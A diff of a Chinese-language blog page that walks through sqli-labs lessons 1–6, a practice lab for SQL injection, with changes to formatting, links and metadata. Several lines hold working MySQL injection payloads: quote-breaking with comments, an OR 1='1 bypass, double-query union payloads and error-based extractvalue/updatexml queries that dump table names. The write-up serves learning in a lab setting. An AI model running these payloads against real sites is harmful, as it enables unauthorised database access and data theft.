@@ -116,7 +116,7 @@
 <meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/columns-1.png">
 <meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/up.png">
 <meta property="og:image" content="https://ocbillhome.files.wordpress.com/2019/07/up1.png">
-<meta property="og:updated_time" content="2019-07-27T03:52:10.661Z">
+<meta property="og:updated_time" content="2019-07-28T12:25:14.523Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs-master les1-les6">
 <meta name="twitter:description" content="[basic challenges] WP1 WP2les1:GET-Error based-Single quotes-String 看到please input the ID as parameter with numeric value后就GET一个id=1[常规测试]">
@@ -392,7 +392,7 @@
 <p>有回显,则没毛病,再来个id=1’试试[单引号测试]</p>
 <p><img src="https://ocbillhome.files.wordpress.com/2019/07/getid1-1.png" alt></p>
 <p>竟然都不行,且从报错来看,查询语句是 <strong><code>SELECT * FROM users WHERE id=&#39;1&#39;</code> <code>LIMIT 0,1;</code></strong>这种结构的</p>
-<p>(但是MySQL注释有3种写法①#注释[URL上要用%23注释]②– 注释(注释前面有个空格[URL上要写–%20注释])③/<em>注释</em>/[这种要成对出现,注入一般用不上])</p>
+<p>(但是MySQL注释有3种写法①#注释[URL上要用%23注释]②– 注释(注释前面有个空格[URL上要写–%20注释])③/*注释*/[这种要成对出现,注入一般用不上])</p>
 <p>那就试试id=1’ or 1=’1(万能密码之一)</p>
 <p><img src="https://ocbillhome.files.wordpress.com/2019/07/id1or11.png" alt></p>
 <p>有回显…但是这好像没什么卵用,还是用注释的来玩吧</p>
@@ -456,10 +456,10 @@
 <p>?id=0”)语句 %23</p>
 <p>les4[完]</p>
 <p>les1-les4是union联合查询的题,分别是单引号,无引号,双引号,单引号带括号</p>
-<h3 id="les5-GET-Double-injection-Single-Quotes-String-les4-5WP"><a href="#les5-GET-Double-injection-Single-Quotes-String-les4-5WP" class="headerlink" title="les5:GET-Double injection-Single Quotes-String les4/5WP"></a>les5:GET-Double injection-Single Quotes-String <a href="https://www.jianshu.com/p/b502893dcc81" target="_blank" rel="noopener">les4/5WP</a></h3><p><img src="https://ocbillhome.files.wordpress.com/2019/07/id1.png" alt></p>
+<h3 id="les5-GET-Double-injection-Single-Quotes-String-les4-5WP"><a href="#les5-GET-Double-injection-Single-Quotes-String-les4-5WP" class="headerlink" title="les5:GET-Double injection-Single Quotes-String les4/5WP"></a>les5:GET-Double injection-Single Quotes-String <a href="https://www.jianshu.com/p/b502893dcc81" target="_blank" rel="noopener">les4/5WP</a></h3><p><a href="https://www.jianshu.com/p/8c2343705100" target="_blank" rel="noopener">报错型注入</a><br><img src="https://ocbillhome.files.wordpress.com/2019/07/id1.png" alt></p>
 <p>les5开头也是要输入id=数字，就GET一个id=1，然后就如上图所示，跟前4题好像有点不大一样</p>
 <p><img src="https://ocbillhome.files.wordpress.com/2019/07/id1-1.png" alt></p>
-<p>单引号测试，报错，猜测语句为<strong><code>SELECT * FROM users WHERE id=&#39;input</code>‘ <code>LIMIT 0,1;</code></strong></p>
+<p>单引号测试，报错，猜测语句为<code>SELECT * FROM users WHERE id=&#39;input</code>‘ <code>LIMIT 0,1;</code></p>
 <p>再看题目：double injection双注入，搜索了一下，有推荐这篇文章：<a href="http://www.2cto.com/article/201303/192718.html?jovova=hvwse3" target="_blank" rel="noopener">详细讲解双查询注入</a></p>
 <p>文章讲到，双注入需要理解以下4个函数：</p>
 <p>①rand()—随机函数—生成一个0到1的随机数</p>
@@ -469,10 +469,10 @@
 <p>select concat((select database()),floor(rand()*2));//如下图所示</p>
 <p><img src="https://ocbillhome.files.wordpress.com/2019/07/selectdatabase-2.png" alt></p>
 <p><strong>数据库:</strong></p>
-<p>?id=0’ union select count(<em>),2,concat(‘</em>‘,(select database()),’<em>‘,floor(rand()</em>2))as a from information_schema.tables group by a %23</p>
+<p>?id=0’ union select count(*),2,concat(‘*‘,(select database()),’*‘,floor(rand()*2))as a from information_schema.tables group by a %23</p>
 <p><img src="https://ocbillhome.files.wordpress.com/2019/07/database-1.png" alt></p>
 <p>然后打算这样爆表名</p>
-<p>?id=0’ union select count(<em>),2,concat(‘</em>‘,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),’<em>‘,floor(rand()</em>2))as a from information_schema.tables group by a %23</p>
+<p>?id=0’ union select count(*),2,concat(‘*‘,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),’*‘,floor(rand()*2))as a from information_schema.tables group by a %23</p>
 <p>发现变成了You are in…… 但是有的dalao的WP明明是这样写的,看来还是要尝试其他姿势</p>
 <p>尝试报错型注入: ?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) –+ /<em>没错这跟les1的是一样的</em>/</p>
 <p>或者?id=1’ and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)%23</p>
@@ -602,7 +602,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
